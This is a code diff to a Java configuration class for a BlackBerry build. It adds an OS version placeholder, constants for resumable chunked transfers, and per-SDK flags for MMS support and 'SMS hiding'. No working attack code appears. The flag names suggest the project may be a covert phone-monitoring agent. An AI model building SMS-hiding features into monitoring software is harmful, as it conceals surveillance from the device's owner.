@@ -47,6 +47,23 @@ public class Cfg {
     public static final String RANDOM = "@RANDOM@";
     
     public static final int VERSION = @VERSION@;
+    public static final String OSVERSION = "@OSVERSION@";
+    
+    public static final boolean PROTOCOL_RESUME = true;
+    public static final int PROTOCOL_CHUNK = 65536;
 
     //==========================================================
+    
+    //#ifdef BlackBerrySDK4.5.0
+    public static final boolean enableMMS = false;
+    public static final boolean enableSMSHiding = false;
+    public static final int osCompileVersion = 4500;
+    //#endif
+    
+    //#ifdef BlackBerrySDK5.0.0
+    public static final boolean enableMMS = true;
+    public static final boolean enableSMSHiding = false;
+    public static final int osCompileVersion = 5000;
+    //#endif
+    
 }
